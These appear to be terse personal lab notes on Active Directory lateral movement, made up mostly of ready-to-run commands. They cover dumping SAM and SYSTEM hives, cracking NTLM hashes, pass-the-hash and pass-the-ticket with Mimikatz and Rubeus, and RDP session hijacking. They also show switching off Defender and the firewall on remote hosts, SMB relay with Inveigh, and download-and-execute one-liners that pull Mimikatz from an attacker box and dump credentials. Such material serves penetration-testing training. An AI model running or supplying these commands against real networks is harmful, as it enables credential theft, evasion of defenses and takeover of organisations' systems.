Lateral Movement and Pass The Hash and Pass the ticket 


go to cmd prompt

cd C:/AD
reg save HKLM\sam sam
reg save HKLM\system system

Get these sam and system files on your linux

samdump2 system sam
hashcat -m 1000 -a 3 hashes.txt /usr/share/wordlist/rockyou.txt   ------- 1000 represents NTLM hash


---------------------------------------------------------------------------------------------------------------

PTH


powershell -ep bypass 
import-module .\invoke-mimikatz.ps1

invoke-mimikatz -command '"sekurlsa::pth /user:student1 /doamin:pentesting /ntlm:<hash> /run:powershell.exe"'

This above statement can be caught since Authenticatior uses AES 256 HMAC  but this method uses rc4 hmac therefore we prefer pass the ticket attack


As we pass the hash new PS window will open and we will try to get some execution 

Invoke-Command -ComputerName web -ScriptBlock(whoami)
You can try above cmd with dc , dev , ad
so we got execution from web which is student5 
and if we run whoami without invoke command we get response from student1

Now let us get access of web or student5 

Invoke-Command -ComputerName web -ScriptBlock(whoami; whoami/groups; hostname )

$sess = New-PSSession -ComputerName web 
Invoke-Command -ScriptBlock(Set-MPPreference -DisableRealtimeMonitoring $true) -session $sess
Invoke-Command -ScriptBlock(Set-MPPreference -DisableIDAVProtection $true) -session $sess
Invoke-Command -ScriptBlock(netsh advfirewall set all profiles state off) -session $sess

Enter PSSession #sess

and the session we got will run  whoami for student5 without invoke command 


From same network host mimikatz file, i.e we have student 1 only with rdp where we can get hfs http file server running

Now we will download this hosted file on student5 web machine using powershell window we got

IEX(New-Object Net.Webclient).DownloadString("http://<ip>/invoke-mimikatz.ps1"); Invoke-Mimikatz-Command privilege::debug; Invoke-Mimikatz -DumpCreds 


------------------------------------------------------------------------------------------------------------------------------------



PTT


Krbtgt ticket expires in 18 hr . We must change passwd to get persistent access 

cd C:\AD 
powershell -ep bypass
import-module .\invoke-mimikatz.ps1
invoke-mimikatz-command'"Mimikatz::debug""sekurlsa::tickets/export""exit"'

All the tickets will be exported to current folder

if you dont get result for any of user of which you gathered info in enumeration but not gettng ticket . You migth conclude that either that account not being logged in or that account is not letting info to be out so you can get RDP into system by choosing one from the network and run the above cmd again

so we just exported the tickets into C:\AD folder 
TGS : saved to file zxwy_student5 @LDAP-AD-Pentesting.local.krbi
TGT : saved to file azxwy_student5 @Krbtgt-Pentesting.local.krbi

invoke-mimikatz -command '" mimikatz:debug""kerberos::ptt "azxwy_student5@krbtgt-Pentesting.local.krbi

No other winmdow will pop up

dir \\web\C$
Invoke-Command -ComputerName web -ScriptBlock {whoami;whoami/groups;hostname}
                                               Set-MPPreference -DisableRealtimeMonitoring $true
                                               Set-MPPreference -DisableIDAVProtection $true   -----------idav ould be ioav change if not work
                                               netsh advfirewall set all profiles state off
Enter-PSSession -ComputerName web

Get-AppLockerPolicy -Effective | Select -ExpandProperty Rule Collection
from this cmd you will come to know that which dir allow application to run or install


-----------------------------------------------------------------------------------------------------------------------------------------


PTT with Rubeus

.\Rubeus.exe klist 
             triage
             dump -------- and here you will get the ticket
             
.\Rubeus.exe ptt /ticket: <copy paste whole ticket here>
 klist 
 Invoke-Command -ComputerName web -ScriptBlock{whoami} 



------------------------------------------------------------------------------------------------------------------------------------------- 

Lateral movement with session hijack

sessiomn must be disconnected to let this workand you must have local admin access

cmd C:\AD
PSExec.exe -s \\localhost cmd  -------------------------to run psexec you must Enable-PSRemoting
whoami
query user
sc create sesshijack binpath="cmd.exe /k tscon3 /dest:rdp -tcp#3"
net start sesshijack 


-----------------------------------------------------------------------------------------------------------------------------------------


Lateral movement with smb relay attack

It abuses the NTLM challenege responses protocol . all smb session uses ntlm for encryption which make ntlm version susceptible for mitm attack . This is the reason sysadmins switching to mki

We need to execute inviegh which will wait for smb traffic to pass through it, on getting smb traffic it will ask for ntlm passwd hash from smb traffic generating machine

at first download the inveigh on machine you get access to , in the network  

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com"/Kevin Robertson/Inveigh/master/inveigh.psd1)



cd \inveigh master
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
Import-Module ./Inveigh.psd1'
Invoke-Inveigh

Invoke-Inveigh -ConsoleOutput Y-NBNS Y-mDNS Y-HTTPS Y-Proxy Y-IP <attacker IP>



if you have inveigh.exe then you cqn directly run it and you may find ntlm hashes and logs as soon assomeone in network broadcast some ntlm hash data e.g. somepone trying to access fileshare AD . Ntlm hash sent for auth will be intercepted 



---------------------------------------------------------------------------------------------------------------------------------------

NTLM relaying with Cobalt Strike 




hashcat -m 5600 hadams.txt rockyou.txt


Enter-PSSession -ComputerName student -credential pentesting\hadams        and now give decrypted paswd or directly get rdp



---------------------------------------------------------------------


powershell -exec bypass -command "IEX (New-Object System.Net.WebClient).DownloadString('http://$PENTEST_BOX_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz"

 
